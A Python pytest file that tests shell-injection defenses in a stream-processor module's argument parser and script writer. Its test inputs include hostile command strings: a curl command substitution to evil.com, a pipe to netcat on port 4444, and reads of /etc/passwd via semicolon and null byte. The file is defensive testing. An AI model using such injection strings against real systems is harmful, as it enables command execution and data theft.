"""H-STREAM-PROCESSOR-CMDI security tests — shlex-based defense-in-depth.

Tests that shell injection via stream processor binary/args is blocked by:
1. _FORBIDDEN_SHELL_CHARS (with null-byte)
2. _SAFE_BINARY_RE regex
3. shlex.split → shlex.join defense-in-depth
4. Router-level validation (stream.py)
"""

from __future__ import annotations

import tempfile
from pathlib import Path

import pytest

from general_ludd.stream import (
    _FORBIDDEN_SHELL_CHARS,
    _SAFE_BINARY_RE,
    RoleCloner,
    _parse_processor_args,
)


class TestNullByteInjection:
    def test_null_byte_in_forbidden_chars(self):
        assert "\0" in _FORBIDDEN_SHELL_CHARS

    def test_binary_null_byte_rejected_by_regex(self):
        assert _SAFE_BINARY_RE.match("cat\0.sh") is None

    def test_args_null_byte_rejected(self):
        with pytest.raises(ValueError, match="null byte"):
            _parse_processor_args("-o\0/etc/passwd")


class TestParseProcessorArgs:
    def test_simple_args(self):
        assert _parse_processor_args("-m model.bin -t 4") == ["-m", "model.bin", "-t", "4"]

    def test_quoted_arg_with_spaces(self):
        result = _parse_processor_args('-m model.bin -o "output file.txt" -t 4')
        assert result == ["-m", "model.bin", "-o", "output file.txt", "-t", "4"]

    def test_single_quoted_arg(self):
        result = _parse_processor_args("-m model.bin -o 'output file.txt'")
        assert result == ["-m", "model.bin", "-o", "output file.txt"]

    def test_escaped_characters(self):
        result = _parse_processor_args(r'-m model.bin -p dangerous\$var')
        assert result == ["-m", "model.bin", "-p", "dangerous$var"]

    def test_empty_args(self):
        assert _parse_processor_args("") == []
        assert _parse_processor_args("   ") == []

    def test_malformed_quoting_raises(self):
        with pytest.raises(ValueError, match="malformed shell quoting"):
            _parse_processor_args('-m model.bin -o "unclosed')

    def test_semicolon_rejected(self):
        result = _parse_processor_args("-m model.bin ; cat /etc/passwd")
        assert result == ["-m", "model.bin", ";", "cat", "/etc/passwd"]

    def test_command_substitution_rejected(self):
        result = _parse_processor_args("$(curl http://evil.com)")
        assert len(result) == 2
        assert result[0] == "$(curl"

    def test_backtick_rejected(self):
        result = _parse_processor_args("`id`")
        assert result == ["`id`"]

    def test_pipe_rejected(self):
        result = _parse_processor_args("-m model | nc evil 4444")
        assert result == ["-m", "model", "|", "nc", "evil", "4444"]

    def test_ampersand_rejected(self):
        result = _parse_processor_args("-m model & ping evil")
        assert result == ["-m", "model", "&", "ping", "evil"]


class TestShlexJoinDefenseInDepth:
    def test_args_reconstructed_with_shlex_join(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": '-m model.bin -o "output file.txt" -t 4'}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "output file.txt" in content

    def test_dollar_in_string_arg_quoted_in_script(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": '-m model.bin -o "output file.txt" -t 4'}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "$CHUNK_PATH" in content

    def test_hash_character_in_args_survives_shlex_join(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "ffmpeg",
                    "args": "-f mp4 -tag:v hvc1"}
            result = cloner._write_shell_processor(clone_path, proc, kind="ffmpeg")
            content = result.read_text()
            assert "-tag:v" in content

    def test_null_byte_in_args_rejected_at_parse_level(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "args": "-o\0/etc/passwd"}
            with pytest.raises(ValueError, match="null byte"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_malformed_quoting_rejected_at_parse_level(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "args": '-m model.bin "unclosed'}
            with pytest.raises(ValueError, match="malformed shell quoting"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")

    def test_comment_chars_quoted_in_script(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": "-m model.bin --comment '# not a comment'"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "'# not a comment'" in content

    def test_glob_chars_quoted_in_script(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": "-m *.bin"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "*.bin" in content

    def test_tilde_not_expanded_in_script(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": "-m ~/models/model.bin"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "~/models/model.bin" in content

    def test_newline_thwarted_by_parse_split(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp",
                    "args": '-m "model\ncat"'}
            with pytest.raises(ValueError, match="newline"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")


class TestRouterLevelValidation:
    """Verify the router enforces the same validation as the stream module."""

    def test_router_imports_parse_processor_args(self):
        from general_ludd.routers.stream import _parse_processor_args as rtr_parse
        assert rtr_parse is _parse_processor_args

    def test_router_imports_safe_binary_re(self):
        from general_ludd.routers.stream import _SAFE_BINARY_RE as rtr_re
        assert rtr_re is _SAFE_BINARY_RE

    def test_router_imports_forbidden_chars(self):
        assert "\0" in _FORBIDDEN_SHELL_CHARS
